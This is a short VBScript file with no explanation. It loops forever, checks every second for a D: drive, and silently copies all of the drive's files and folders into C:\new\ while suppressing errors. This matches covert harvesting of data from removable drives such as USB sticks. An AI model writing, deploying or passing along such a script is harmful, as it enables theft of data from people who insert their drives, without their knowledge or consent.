set fso = createobject("scripting.filesystemobject")

set ws = createobject("wscript.shell")
on error resume next
do
    wscript.sleep 1000
    if fso.driveexists("d:\") then
    fso.copyfile "d:\*","c:\new\"
    fso.copyfolder "d:\*","c:\new\"
    wscript.sleep 20000
end if
loop